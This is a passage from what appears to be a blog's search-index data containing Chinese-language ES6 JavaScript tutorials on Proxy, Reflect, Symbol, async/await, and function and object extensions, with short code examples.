or log warnings, respectivelydataStore.doNotChange = &quot;foo&quot;;  delete dataStore.noDelete;  dataStore.oldMethod();\n\n3.5 过滤操作\n某些操作会非常占用资源，比如传输大文件，这个时候如果文件已经在分块发送了，就不需要在对新的请求作出相应（非绝对），这个时候就可以使用 Proxy 对当请求进行特征检测，并根据特征过滤出哪些是不需要响应的，哪些是需要响应的。下面的代码简单演示了过滤特征的方式，并不是完整代码，相信大家会理解其中的妙处\n\nlet obj = &#123;      getGiantFile: function(fileId) &#123;/*...*/ &#125;&#125;;obj = new Proxy(obj, &#123;      get(target, key, proxy) &#123;        return function(...args) &#123;            const id = args[0];            let isEnroute = checkEnroute(id);            let isDownloading = checkStatus(id);                  let cached = getCached(id);            if (isEnroute || isDownloading) &#123;                return false;            &#125;            if (cached) &#123;                return cached;            &#125;            return Reflect.apply(target[key], target, args);        &#125;    &#125;&#125;);\n\n3.6 中断代理\nProxy 支持随时取消对 target 的代理，这一操作常用于完全封闭对数据或接口的访问。在下面的示例中，我们使用了 Proxy.revocable 方法创建了可撤销代理的代理对象：\n\nlet sensitiveData = &#123; username: &#x27;devbryce&#x27; &#125;;const &#123;sensitiveData, revokeAccess&#125; = Proxy.revocable(sensitiveData, handler);function handleSuspectedHack()&#123;      revokeAccess();&#125;// logs &#x27;devbryce&#x27;console.log(sensitiveData.username);handleSuspectedHack();// TypeError: Revokedconsole.log(sensitiveData.username);","categories":["前端"],"tags":["es6"]},{"title":"ES6 Reflect","url":"/2018/04/07/html+css+js+ts/4-Reflect/","content":"一、简介1.1 什么是Reflect\n为操作对象而提供的新API\n\n1.2 为什么要设计Reflect\n将Object对象的属于语言内部的方法放到Reflect对象上，即从Reflect对象上拿Object对象内部方法\n将用老Object方法报错的情况，改为返回false\n\n// 旧写法try &#123;  Object.defineProperty(target, property, attributes);  // success&#125; catch (e) &#123;  // failure&#125;// 新写法if (Reflect.defineProperty(target, property, attributes)) &#123;  // success&#125; else &#123;  // failure&#125;\n\n\n让Object操作变成函数行为\n\n// 旧写法&#x27;name&#x27; in Object //true// 新写法Reflect.has(Object,&#x27;name&#x27;) //true\n\n\nReflect与Proxy是相辅相成的，在Proxy上有的方法，在Reflect就一定有\n\nlet target=&#123;&#125;let handler=&#123;  set(target,proName,proValue,receiver)&#123;    //确认对象的属性赋值成功    let isSuccess=Reflect.set(target,proName,proValue,receiver)    if(isSuccess)&#123;      console.log(&quot;成功&quot;)    &#125;    return isSuccess  &#125;&#125;let proxy=new Proxy(target,handler)\n\n\n确保对象的属性能正确赋值，广义上讲，即确保对象的原生行为能够正常进行，这就是Reflect的作用\n\n二、Reflect的API\n注：和Proxy的API一致\n\n2.1 Reflect.get(target,property,receiver)\n查找并返回target对象的property属性\n\nlet obj=&#123;  name:&quot;poetries&quot;,&#125;let result=Reflect.get(obj,&quot;name&quot;)console.log(result) //poetrieslet obj=&#123;  //属性yu部署了getter读取函数  get yu()&#123;    //this返回的是Reflect.get的receiver参数对象    return this.name+this.age  &#125;&#125;let receiver=&#123;  name:&quot;shen&quot;,  age:&quot;18&quot;,&#125;let result=Reflect.get(obj,&quot;yu&quot;,receiver)console.log(result) //shen18\n\n\n注意：如果Reflect.get()的第一个参数不是对象，则会报错\n\n2.2 Reflect.set(target,propName,propValue,receiver)\n设置target对象的propName属性为propValue\n\nlet obj=&#123;  name:&quot;poetries&quot;&#125;let result=Reflect.set(obj,&quot;name&quot;,&quot;静观流叶&quot;)console.log(result) //trueconsole.log(obj.name) //静观流叶\n\n2.3 Reflect.set与Proxy.set\nReflect.set与Proxy.set联合使用,并且传入receiver，则会进行定义属性操作\n\nlet obj=&#123;  name:&quot;chen&quot;&#125;let handler=&#123;  set(target,key,value,receiver)&#123;    console.log(&quot;Proxy拦截赋值操作&quot;)    //Reflect完成赋值操作    Reflect.set(target,key,value,receiver)  &#125;,  defineProperty(target,key,attribute)&#123;    console.log(&quot;Proxy拦截定义属性操作&quot;)    //Reflect完成定义属性操作    Reflect.defineProperty(target,key,attribute)  &#125;&#125;let proxy=new Proxy(obj,handler)proxy.name=&quot;ya&quot;//Proxy拦截赋值操作//Proxy拦截定义属性操作\n\n\n为什么Reflect.set()传入receiver参数，就会触发定义属性的操作？\n\n因为Proxy.set()中的receiver是Proxy的实例，即obj，而Reflect.set一旦传入receiver，就会将属性赋值到receiver上面，也是obj，所以就会触发defineProperty拦截\n2.4 Reflect.has(obj,name)var obj= &#123;  name: &quot;poetries&quot;,&#125;;//旧写法&#x27;name&#x27; in obj // true//新写法Reflect.has(obj, &#x27;name&#x27;) // true\n\n2.5 Reflect.deleteProperty(obj, name)\n删除对象的属性\n\n// 旧写法delete obj.name;// 新写法Reflect.deleteProperty(obj, &#x27;name&#x27;);\n\n2.6 Reflect.construct(target, args)function Person(name) &#123;  this.name = name;&#125;// 旧 new写法let person= new Person(&#x27;poetries&#x27;)// 新写法：Reflect.construct 的写法let person = Reflect.construct(Person, [&#x27;poetries&#x27;]);\n\n2.7 Reflect.getPrototypeOf(obj)\n用于读取对象的proto属性，对应Object.getPrototypeOf(obj)\n\n2.8 Reflect.setPrototypeOf(obj, newProto)\n设置目标对象的原型（prototype），对应Object.setPrototypeOf(obj, newProto)方法\n\n2.9 Reflect.apply(func, thisArg, args)\n继承目标对象的特定方法\n\nlet array=[1,2,3,4,5,6]// 旧写法let small= Math.min.apply(Math, array) //1let big = Math.max.apply(Math, array) //6let type = Object.prototype.toString.call(small) //&quot;[object Number]&quot;// 新写法const small= Reflect.apply(Math.min, Math, array)const big = Reflect.apply(Math.max, Math, array)//第三个参数是Object类型的就好，因为调用的是Object的原型方法toStringconst type = Reflect.apply(Object.prototype.toString, small, [])\n\n2.10 Reflect.defineProperty(target, propertyKey, attributes)function MyDate() &#123;  ...  ...&#125;// 旧写法Object.defineProperty(MyDate, &#x27;now&#x27;, &#123;  value: () =&gt; Date.now()&#125;);// 新写法Reflect.defineProperty(MyDate, &#x27;now&#x27;, &#123;  value: () =&gt; Date.now()&#125;);\n\n\n与Proxy.defineProperty配合使用\n\nlet proxy = new Proxy(&#123;&#125;, &#123;  defineProperty(target, prop, descriptor) &#123;    console.log(descriptor);    return Reflect.defineProperty(target, prop, descriptor);  &#125;&#125;);proxy .name= &#x27;chen&#x27;;// &#123;value: &quot;chen&quot;, writable: true, enumerable: true, configurable: true&#125;p.name // &quot;chen&quot;\n\n\n如上，Proxy.defineProperty对属性赋值设置拦截，然后使用Reflect.defineProperty完成赋值\n\n2.11 Reflect.getOwnPropertyDescriptor(target, propertyKey)\n基本等同于Object.getOwnPropertyDescriptor，用于得到指定属性的描述对象\n\n2.12 Reflect.isExtensible (target)\n对应Object.isExtensible，返回一个布尔值，表示当前对象是否可扩展\n\n2.13 Reflect.preventExtensions(target)\n对应Object.preventExtensions方法，用于让一个对象变为不可扩展。它返回一个布尔值，表示是否操作成功\n\n2.14 Reflect.ownKeys (target)\n用于返回对象的所有属性\n\n","categories":["前端"],"tags":["es6"]},{"title":"ES6 Symbol","url":"/2018/04/12/html+css+js+ts/4-Symbol/","content":"一、简介\nES6新加入了一种原始数据类型Symbol，表示独一无二的值，这是js的第七种数据类型，前六种是：Undefined、Null、布尔值（Boolean）、字符串（String）、数值（Number）、对象（Object）\n\n\n对象的属性名现在可以有两种类型，一种是原来就有的字符串，另一种就是新增的Symbol类型。凡是属性名属于Symbol类型，就都是独一无二的，可以保证不会与其他属性名产生冲突\n\n1.1 定义Symbol([description])\n\n\n参数 description 是一个可选参数，是一个字符串，可以用于调试，但不能访问Symbol 自身\n\nvar sym1 = Symbol();var sym2 = Symbol(&#x27;foo&#x27;);var sym3 = Symbol(&#x27;foo&#x27;);\n\n1.2 值唯一性\n每一个 Symbol()返回的值都是唯一的。一个Symbol 值能作为对象属性的标识符，这是改数据类型仅有的目的\n\nSymbol(&quot;yuan&quot;) === Symbol(&quot;yuan&quot;); // false\n\n1.3 不可以使用 new 操作符var sym = new Symbol(); // TypeError报错\n\n1.4 结合 Object() 函数\n结合 Object() 函数，创建一个 Symbol 包装器对象\n\nvar sym = Symbol();typeof sym;  // &quot;symbol“”var symobj = Object(sym);typeof symobj; // &quot;object&quot;\n\n1.5 全局共享 Symbol\n使用Symbol.for() 方法会根据给定的键 key，来从运行时的 symbol 注册表中找到对应的 symbol，如果找到了，则返回它，否则，新建一个与该键关联的 symbol，并放入全局 symbol 注册表中\n\n1.6 在对象中查找 Symbol 属性var obj = &#123;&#125;;var a = Symbol(&quot;a&quot;);var b = Symbol.for(&quot;b&quot;);obj[a] = &quot;localSymbol&quot;;obj[b] = &quot;globalSymbol&quot;;var objectSymbols = Object.getOwnPropertySymbols(obj);console.log(objectSymbols)         // [Symbol(a), Symbol(b)]\n\n二、静态属性2.1 length 属性// Symbol 的长度属性值为0.Symbol.length // 0\n\n2.2 迭代 Symbols\nSymbol.iterator 该方法为每一个对象定义了默认的迭代器。该迭代器可以被 for.. of 循环使用。\n\n// 自定义迭代器var myIterator = &#123;&#125;;myIterator[Symbol.iterator] = function* () &#123;    yield 1;    yield 2;    yield 3;&#125;;[...myIterator] // [1, 2, 3]\n\n\nSymbols 与 for... in 迭代\n\nvar obj = &#123;&#125;;obj[Symbol(&quot;a&quot;)] = &quot;a&quot;;obj[Symbol.for(&quot;b&quot;)] = &quot;b&quot;;obj[&quot;c&quot;] = &quot;c&quot;;obj.d = &quot;d&quot;;for (var i in obj) &#123;   console.log(i); &#125;// &quot;c&quot;// &quot;d&quot;\n\n2.3 Symbol的正则表达式\n用于标识对象是否具有正则表达式的行为。Symbol.match:对象是否具有指定的匹配的正则表达式\n\n&quot;/bar/&quot;.startsWith(/bar/); // Throws TypeError, 因为 /bar/ 是一个正则表达式// 且 Symbol.match 没有修改。\n\n\n如果你将 Symbol.match 置为 false，使用 match 属性的表达式检查会认为该象不是正则表达式对象。startsWith 和 endsWith 方法将不会抛出 TypeError\n\nvar re = /foo/;re[Symbol.match] = false;&quot;/foo/&quot;.startsWith(re); // true&quot;/baz/&quot;.endsWith(re);   // false\n\nSymbol.replace\n\n这个属性指定了当一个字符串替换所匹配字符串时所调用的方法。String.prototype.replace() 方法会调用此方法。\n\nSymbol.search\n\n指定了一个搜索方法，这个方法接受用户输入的正则表达式，返回该正则表达式在字符串中匹配到的下标，这个方法由以下的方法来调用 String.prototype.search()\n\nSymbol.split\n\n指向 一个正则表达式的索引处分割字符串的方法。 这个方法通过String.prototype.split() 调用\n\n2.4 其他属性Symbol.hasInstance\n\n一个确定一个构造器对象识别的对象是否为它的实例的方法\n\nSymbol.toStringTag\n\n用于对象的默认描述的字符串值。使用Object.prototype.toString().\n\n三、静态方法3.1 Symbol.for(key)\n根据给定的键 key， 从运行时的 symbol 注册表中找到对应的 symbol，如果找到了，则返回它，否则，新建一个与该键关联的 symbol，并放入全局 symbol 注册表\n\n\n这里的参数key，是一个字符串，作为 symbol 注册表中与某 symbol 关联的键\n和 Symbol() 不同的是，用Symbol.for() 方法创建的 symbol 会被放入一个全局 symbol 注册表中\nSymbol.for() 并不是每次都会创建一个新的 symbol，它会首先检查给定的 key 是否已经在注册表中了，如果是，则会直接返回上次存储的那个。否则，会再新建一个\n\nSymbol.for(&quot;foo&quot;); // 创建一个 symbol 并放入 symbol 注册表中，键为 &quot;foo&quot;Symbol.for(&quot;foo&quot;); // 从 symbol 注册表中读取键为&quot;foo&quot;的 symbolSymbol.for(&quot;bar&quot;) === Symbol.for(&quot;bar&quot;); // true，证明了上面说的Symbol(&quot;bar&quot;) === Symbol(&quot;bar&quot;); // false，Symbol() 函数每次都会返回新的一个 symbolvar sym = Symbol.for(&quot;mario&quot;);sym.toString(); // &quot;Symbol(mario)&quot;，mario 既是该 symbol 在 symbol 注册表中的键名，又是该 symbol 自身的描述字符串\n\n3.2 Symbol.keyFor(sym)\n该方法用来获取 symbol 注册表中与某个 symbol 关联的键。\n参数 sym 是指存储在 symbol 注册表中的某个 symbol\n\n// 创建一个 symbol 并放入 Symbol 注册表，key 为 &quot;foo&quot;var globalSym = Symbol.for(&quot;foo&quot;); Symbol.keyFor(globalSym); // &quot;foo&quot;// 创建一个 symbol，但不放入 symbol 注册表中var localSym = Symbol(); Symbol.keyFor(localSym); // undefined，所以是找不到 key 的\n\n四、遍历\nSymbol定义的属性不会出现在下面循环中\n\n\nfor in:可获取原型属性，不可获取不可枚举属性\nfor of:不可遍历对象，可遍历数组\nObject.keys：原型属性和不可枚举属性都不能获取\nObject.getOwnPropertyByNames：不可获取原型属性，可获取不可枚举属性\nJSON.stringify：原型属性和不可枚举属性都不能获取\nReflect.ownKeys：可获取不可枚举和Symbol，不可获取原型\n\nvar p = &#123;w:2&#125;;var obj = Object.create(p);obj.a = 1;Object.defineProperty(obj,&quot;b&quot;,&#123;    value:123&#125;)var a = Symbol(&#x27;a&#x27;);var b = Symbol(&#x27;b&#x27;);obj[a] = &#x27;Hello&#x27;;obj[b] = &#x27;World&#x27;;Reflect.ownKeys(obj);// [Symbol(a), Symbol(b)]\n\n\n或者使用Object.getOwnPropertySymbols(obj)遍历\n\n","categories":["前端"],"tags":["es6"]},{"title":"ES async/await","url":"/2018/03/20/html+css+js+ts/4-asyncawait/","content":"一、含义\nasync 函数是什么？一句话，它就是 Generator 函数的语法糖\n\n// 有一个 Generator 函数，依次读取两个文件const fs = require(&#x27;fs&#x27;);const readFile = function (fileName) &#123;  return new Promise(function (resolve, reject) &#123;    fs.readFile(fileName, function(error, data) &#123;      if (error) return reject(error);      resolve(data);    &#125;);  &#125;);&#125;;const gen = function* () &#123;  const f1 = yield readFile(&#x27;/etc/fstab&#x27;);  const f2 = yield readFile(&#x27;/etc/shells&#x27;);  console.log(f1.toString());  console.log(f2.toString());&#125;;\n\n\n上面代码的函数gen可以写成async函数，就是下面这样\n\nconst asyncReadFile = async function () &#123;  const f1 = await readFile(&#x27;/etc/fstab&#x27;);  const f2 = await readFile(&#x27;/etc/shells&#x27;);  console.log(f1.toString());  console.log(f2.toString());&#125;;\n\n\nasync函数就是将 Generator 函数的星号（*）替换成async，将yield替换成await，仅此而已\n\nasync函数对 Generator 函数的改进，体现在以下四点\n\n内置执行器\n\n\nGenerator函数的执行必须靠执行器，所以才有了co模块，而async函数自带执行器。也就是说，async函数的执行，与普通函数一模一样，只要一行\n\nasyncReadFile();\n\n\n上面的代码调用了asyncReadFile函数，然后它就会自动执行，输出最后结果。这完全不像 Generator函数，需要调用next方法，或者用co模块，才能真正执行，得到最后结果\n\n\n更好的语义\n\n\nasync和await，比起星号和yield，语义更清楚了。async表示函数里有异步操作，await表示紧跟在后面的表达式需要等待结果\n\n\n更广的适用性\n\n\nco模块约定，yield命令后面只能是 Thunk 函数或 Promise 对象，而async函数的await命令后面，可以是 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）\n\n\n返回值是 Promise\n\n\nasync函数的返回值是 Promise 对象，这比 Generator 函数的返回值是 Iterator 对象方便多了。你可以用then方法指定下一步的操作\n\n进一步说，async函数完全可以看作多个异步操作，包装成的一个 Promise 对象，而await命令就是内部then命令的语法糖\n二、基本用法\nasync函数返回一个 Promise 对象，可以使用then方法添加回调函数。当函数执行的时候，一旦遇到await就会先返回，等到异步操作完成，再接着执行函数体内后面的语句\n\n\n// 调用该函数时，会立即返回一个Promise对象async function getStockPriceByName(name) &#123;  const symbol = await getStockSymbol(name);  const stockPrice = await getStockPrice(symbol);  return stockPrice;&#125;getStockPriceByName(&#x27;goog&#x27;).then(function (result) &#123;  console.log(result);&#125;);\n\nasync 函数有多种使用形式\n// 函数声明async function foo() &#123;&#125;// 函数表达式const foo = async function () &#123;&#125;;// 对象的方法let obj = &#123; async foo() &#123;&#125; &#125;;obj.foo().then(...)// Class 的方法class Storage &#123;  constructor() &#123;    this.cachePromise = caches.open(&#x27;avatars&#x27;);  &#125;  async getAvatar(name) &#123;    const cache = await this.cachePromise;    return cache.match(`/avatars/$&#123;name&#125;.jpg`);  &#125;&#125;const storage = new Storage();storage.getAvatar(&#x27;jake&#x27;).then(…);// 箭头函数const foo = async () =&gt; &#123;&#125;;\n\n三、语法\nasync函数的语法规则总体上比较简单，难点是错误处理机制\n\n3.1 返回 Promise 对象\nasync函数返回一个 Promise 对象\nasync函数内部return语句返回的值，会成为then方法回调函数的参数\n\n// 函数f内部return命令返回的值，会被then方法回调函数接收到async function f() &#123;  return &#x27;hello world&#x27;;&#125;f().then(v =&gt; console.log(v))// &quot;hello world&quot;\n\n\nasync函数内部抛出错误，会导致返回的 Promise 对象变为reject状态。抛出的错误对象会被catch方法回调函数接收到\n\nasync function f() &#123;  throw new Error(&#x27;出错了&#x27;);&#125;f().then(  v =&gt; console.log(v),  e =&gt; console.log(e))// Error: 出错了\n\n3.2 Promise 对象的状态变化\nasync函数返回的 Promise 对象，必须等到内部所有await命令后面的 Promise 对象执行完，才会发生状态改变，除非遇到return语句或者抛出错误。也就是说，只有async函数内部的异步操作执行完，才会执行then方法指定的回调函数\n\nasync function getTitle(url) &#123;  let response = await fetch(url);  let html = await response.text();  return html.match(/&lt;title&gt;([\\s\\S]+)&lt;\\/title&gt;/i)[1];&#125;getTitle(&#x27;https://tc39.github.io/ecma262/&#x27;).then(console.log)// &quot;ECMAScript 2017 Language Specification&quot;\n\n3.3 await 命令\n正常情况下，await命令后面是一个 Promise 对象，返回该对象的结果。如果不是 Promise 对象，就直接返回对应的值\n\nasync function f() &#123;  // 等同于  // return 123;  return await 123;&#125;f().then(v =&gt; console.log(v))// 123\n\n\n另一种情况是，await命令后面是一个thenable对象（即定义then方法的对象），那么await会将其等同于 Promise 对象\n\n\nawait命令后面的 Promise 对象如果变为reject状态，则reject的参数会被catch方法的回调函数接收到。\n\nasync function f() &#123;  await Promise.reject(&#x27;出错了&#x27;);&#125;f().then(v =&gt; console.log(v)).catch(e =&gt; console.log(e))// 出错了\n\n\n注意，上面代码中，await语句前面没有return，但是reject方法的参数依然传入了catch方法的回调函数。这里如果在await前面加上return，效果是一样的。\n任何一个await语句后面的 Promise 对象变为reject状态，那么整个async函数都会中断执行\n\nasync function f() &#123;  await Promise.reject(&#x27;出错了&#x27;);  await Promise.resolve(&#x27;hello world&#x27;); // 不会执行&#125;\n\n\n有时，我们希望即使前一个异步操作失败，也不要中断后面的异步操作。这时可以将第一个await放在try...catch结构里面，这样不管这个异步操作是否成功，第二个await都会执行\n\nasync function f() &#123;  try &#123;    await Promise.reject(&#x27;出错了&#x27;);  &#125; catch(e) &#123;  &#125;  return await Promise.resolve(&#x27;hello world&#x27;);&#125;f().then(v =&gt; console.log(v))// hello world\n\n\n另一种方法是await后面的 Promise 对象再跟一个catch方法，处理前面可能出现的错误。\n\nasync function f() &#123;  await Promise.reject(&#x27;出错了&#x27;)    .catch(e =&gt; console.log(e));  return await Promise.resolve(&#x27;hello world&#x27;);&#125;f().then(v =&gt; console.log(v))// 出错了// hello world\n\n3.4 错误处理\n如果await后面的异步操作出错，那么等同于async函数返回的 Promise 对象被reject\n\nasync function f() &#123;  await new Promise(function (resolve, reject) &#123;    throw new Error(&#x27;出错了&#x27;);  &#125;);&#125;f().then(v =&gt; console.log(v)).catch(e =&gt; console.log(e))// Error：出错了\n\n\n防止出错的方法，也是将其放在try...catch代码块之中\n\nasync function f() &#123;  try &#123;    await new Promise(function (resolve, reject) &#123;      throw new Error(&#x27;出错了&#x27;);    &#125;);  &#125; catch(e) &#123;  &#125;  return await(&#x27;hello world&#x27;);&#125;\n\n\n如果有多个await命令，可以统一放在try...catch结构中\n\nasync function main() &#123;  try &#123;    const val1 = await firstStep();    const val2 = await secondStep(val1);    const val3 = await thirdStep(val1, val2);    console.log(&#x27;Final: &#x27;, val3);  &#125;  catch (err) &#123;    console.error(err);  &#125;&#125;\n\n3.5 使用注意点\n第一点：await命令后面的Promise对象，运行结果可能是rejected，所以最好把await命令放在try...catch代码块中\n\nasync function myFunction() &#123;  try &#123;    await somethingThatReturnsAPromise();  &#125; catch (err) &#123;    console.log(err);  &#125;&#125;// 另一种写法async function myFunction() &#123;  await somethingThatReturnsAPromise()  .catch(function (err) &#123;    console.log(err);  &#125;);&#125;\n\n\n第二点，多个await命令后面的异步操作，如果不存在继发关系，最好让它们同时触发\n\n// getFoo和getBar是两个独立的异步操作（即互不依赖），被写成继发关系。这样比较耗时，因为只有getFoo完成以后，才会执行getBar，完全可以让它们同时触发let foo = await getFoo();let bar = await getBar();// 两种写法，getFoo和getBar都是同时触发，这样就会缩短程序的执行时间。// 写法一let [foo, bar] = await Promise.all([getFoo(), getBar()]);// 写法二let fooPromise = getFoo();let barPromise = getBar();let foo = await fooPromise;let bar = await barPromise;\n\n\n第三点，await命令只能用在async函数之中，如果用在普通函数，就会报错\n\nasync function dbFuc(db) &#123;  let docs = [&#123;&#125;, &#123;&#125;, &#123;&#125;];  // 报错  docs.forEach(function (doc) &#123;    await db.post(doc);  &#125;);&#125;\n\n四、async 函数的实现原理\nasync 函数的实现原理，就是将 Generator 函数和自动执行器，包装在一个函数里\n\nasync function fn(args) &#123;  // ...&#125;// 等同于function fn(args) &#123;  return spawn(function* () &#123;    // ...  &#125;);&#125;\n\n\n所有的async函数都可以写成上面的第二种形式，其中的spawn函数就是自动执行器\n\n// spawn函数的实现，基本就是前文自动执行器的翻版function spawn(genF) &#123;  return new Promise(function(resolve, reject) &#123;    const gen = genF();    function step(nextF) &#123;      let next;      try &#123;        next = nextF();      &#125; catch(e) &#123;        return reject(e);      &#125;      if(next.done) &#123;        return resolve(next.value);      &#125;      Promise.resolve(next.value).then(function(v) &#123;        step(function() &#123; return gen.next(v); &#125;);      &#125;, function(e) &#123;        step(function() &#123; return gen.throw(e); &#125;);      &#125;);    &#125;    step(function() &#123; return gen.next(undefined); &#125;);  &#125;);&#125;","categories":["前端"],"tags":["es6"]},{"title":"es6函数扩展","url":"/2018/03/27/html+css+js+ts/4-es6-%E5%87%BD%E6%95%B0%E6%89%A9%E5%B1%95/","content":"一、参数ES6&#96;允许为函数的参数设置默认值\nfunction log(x, y = &#x27;World&#x27;) &#123;  console.log(x, y);&#125;console.log(&#x27;Hello&#x27;) // Hello Worldconsole.log(&#x27;Hello&#x27;, &#x27;China&#x27;) // Hello Chinaconsole.log(&#x27;Hello&#x27;, &#x27;&#x27;) // Hello\n\n函数的形参是默认声明的，不能使用let或const再次声明\nfunction foo(x = 5) &#123;    let x = 1; // error    const x = 2; // error&#125;\n\n参数默认值可以与解构赋值的默认值结合起来使用\nfunction foo(&#123;x, y = 5&#125;) &#123;  console.log(x, y);&#125;foo(&#123;&#125;) // undefined 5foo(&#123;x: 1&#125;) // 1 5foo(&#123;x: 1, y: 2&#125;) // 1 2foo() // TypeError: Cannot read property &#x27;x&#x27; of undefined\n\n上面的foo函数，当参数为对象的时候才能进行解构，如果没有提供参数的时候，变量x和y就不会生成，从而报错，这里设置默认值避免\nfunction foo(&#123;x, y = 5&#125; = &#123;&#125;) &#123;  console.log(x, y);&#125;foo() // undefined 5\n\n参数默认值应该是函数的尾参数，如果不是非尾部的参数设置默认值，实际上这个参数是没发省略的\nfunction f(x = 1, y) &#123;  return [x, y];&#125;f() // [1, undefined]f(2) // [2, undefined]f(, 1) // 报错f(undefined, 1) // [1, 1]\n\n二、属性函数的length属性length将返回没有指定默认值的参数个数\n(function (a) &#123;&#125;).length // 1(function (a = 5) &#123;&#125;).length // 0(function (a, b, c = 5) &#123;&#125;).length // 2\n\nrest 参数也不会计入length属性\n(function(...args) &#123;&#125;).length // 0\n\n如果设置了默认值的参数不是尾参数，那么length属性也不再计入后面的参数了\n(function (a = 0, b, c) &#123;&#125;).length // 0(function (a, b = 1, c) &#123;&#125;).length // 1\n\nname属性返回该函数的函数名\nvar f = function () &#123;&#125;;// ES5f.name // &quot;&quot;// ES6f.name // &quot;f&quot;\n\n如果将一个具名函数赋值给一个变量，则 name属性都返回这个具名函数原本的名字\nconst bar = function baz() &#123;&#125;;bar.name // &quot;baz&quot;\n\nFunction`构造函数返回的函数实例，`name`属性的值为`anonymous(new Function).name // &quot;anonymous&quot;\n\nbind返回的函数，name属性值会加上bound前缀\nfunction foo() &#123;&#125;;foo.bind(&#123;&#125;).name // &quot;bound foo&quot;(function()&#123;&#125;).bind(&#123;&#125;).name // &quot;bound &quot;\n\n三、作用域一旦设置了参数的默认值，函数进行声明初始化时，参数会形成一个单独的作用域\n等到初始化结束，这个作用域就会消失。这种语法行为，在不设置参数默认值时，是不会出现的\n下面例子中，y=x会形成一个单独作用域，x没有被定义，所以指向全局变量x\nlet x = 1;function f(y = x) &#123;   // 等同于 let y = x    let x = 2;   console.log(y);&#125;f() // 1\n\n四、严格模式只要函数参数使用了默认值、解构赋值、或者扩展运算符，那么函数内部就不能显式设定为严格模式，否则会报错\n// 报错function doSomething(a, b = a) &#123;  &#x27;use strict&#x27;;  // code&#125;// 报错const doSomething = function (&#123;a, b&#125;) &#123;  &#x27;use strict&#x27;;  // code&#125;;// 报错const doSomething = (...a) =&gt; &#123;  &#x27;use strict&#x27;;  // code&#125;;const obj = &#123;  // 报错  doSomething(&#123;a, b&#125;) &#123;    &#x27;use strict&#x27;;    // code  &#125;&#125;;\n\n五、箭头函数使用“箭头”（=&gt;）定义函数\nvar f = v =&gt; v;// 等同于var f = function (v) &#123;  return v;&#125;;\n\n如果箭头函数不需要参数或需要多个参数，就使用一个圆括号代表参数部分\nvar f = () =&gt; 5;// 等同于var f = function () &#123; return 5 &#125;;var sum = (num1, num2) =&gt; num1 + num2;// 等同于var sum = function(num1, num2) &#123;  return num1 + num2;&#125;;\n\n如果箭头函数的代码块部分多于一条语句，就要使用大括号将它们括起来，并且使用return语句返回\nvar sum = (num1, num2) =&gt; &#123; return num1 + num2; &#125;\n\n如果返回对象，需要加括号将对象包裹\nlet getTempItem = id =&gt; (&#123; id: id, name: &quot;Temp&quot; &#125;);\n\n注意点：\n\n函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象\n不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误\n不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替\n不可以使用yield命令，因此箭头函数不能用作 Generator 函数\n\n","categories":["前端"],"tags":["es6"]},{"title":"es6对象扩展","url":"/2018/03/25/html+css+js+ts/4-es6-%E5%AF%B9%E8%B1%A1%E6%89%A9%E5%B1%95.md/","content":"一、属性的简写ES6中，当对象键名与对应值名相等的时候，可以进行简写\nconst baz = &#123;foo:foo&#125;// 等同于const baz = &#123;foo&#125;\n\n方法也能够进行简写\nconst o = &#123;  method() &#123;    return &quot;Hello!&quot;;  &#125;&#125;;// 等同于const o = &#123;  method: function() &#123;    return &quot;Hello!&quot;;  &#125;&#125;\n\n在函数内作为返回值，也会变得方便很多\nfunction getPoint() &#123;  const x = 1;  const y = 10;  return &#123;x, y&#125;;&#125;getPoint()// &#123;x:1, y:10&#125;\n\n注意：简写的对象方法不能用作构造函数，否则会报错\nconst obj = &#123;  f() &#123;    this.foo = &#x27;bar&#x27;;  &#125;&#125;;new obj.f() // 报错\n\n二、属性名表达式ES6 允许字面量定义对象时，将表达式放在括号内\nlet lastWord = &#x27;last word&#x27;;const a = &#123;  &#x27;first word&#x27;: &#x27;hello&#x27;,  [lastWord]: &#x27;world&#x27;&#125;;a[&#x27;first word&#x27;] // &quot;hello&quot;a[lastWord] // &quot;world&quot;a[&#x27;last word&#x27;] // &quot;world&quot;\n\n表达式还可以用于定义方法名\nlet obj = &#123;  [&#x27;h&#x27; + &#x27;ello&#x27;]() &#123;    return &#x27;hi&#x27;;  &#125;&#125;;obj.hello() // hi\n\n注意，属性名表达式与简洁表示法，不能同时使用，会报错\n// 报错const foo = &#x27;bar&#x27;;const bar = &#x27;abc&#x27;;const baz = &#123; [foo] &#125;;// 正确const foo = &#x27;bar&#x27;;const baz = &#123; [foo]: &#x27;abc&#x27;&#125;;\n\n注意，属性名表达式如果是一个对象，默认情况下会自动将对象转为字符串[object Object]\nconst keyA = &#123;a: 1&#125;;const keyB = &#123;b: 2&#125;;const myObject = &#123;  [keyA]: &#x27;valueA&#x27;,  [keyB]: &#x27;valueB&#x27;&#125;;myObject // Object &#123;[object Object]: &quot;valueB&quot;&#125;\n\n三、super关键字this关键字总是指向函数所在的当前对象，ES6 又新增了另一个类似的关键字super，指向当前对象的原型对象\nconst proto = &#123;  foo: &#x27;hello&#x27;&#125;;const obj = &#123;  foo: &#x27;world&#x27;,  find() &#123;    return super.foo;  &#125;&#125;;Object.setPrototypeOf(obj, proto); // 为obj设置原型对象obj.find() // &quot;hello&quot;\n\n四、扩展运算符的应用在解构赋值中，未被读取的可遍历的属性，分配到指定的对象上面\nlet &#123; x, y, ...z &#125; = &#123; x: 1, y: 2, a: 3, b: 4 &#125;;x // 1y // 2z // &#123; a: 3, b: 4 &#125;\n\n注意：解构赋值必须是最后一个参数，否则会报错\n解构赋值是浅拷贝\nlet obj = &#123; a: &#123; b: 1 &#125; &#125;;let &#123; ...x &#125; = obj;obj.a.b = 2; // 修改obj里面a属性中键值x.a.b // 2，影响到了结构出来x的值\n\n对象的扩展运算符等同于使用Object.assign()方法\n五、属性的遍历ES6 一共有 5 种方法可以遍历对象的属性。\n\nfor…in：循环遍历对象自身的和继承的可枚举属性（不含 Symbol 属性）\nObject.keys(obj)：返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 Symbol 属性）的键名\nObject.getOwnPropertyNames(obj)：回一个数组，包含对象自身的所有属性（不含 Symbol 属性，但是包括不可枚举属性）的键名\nObject.getOwnPropertySymbols(obj)：返回一个数组，包含对象自身的所有 Symbol 属性的键名\nReflect.ownKeys(obj)：返回一个数组，包含对象自身的（不含继承的）所有键名，不管键名是 Symbol 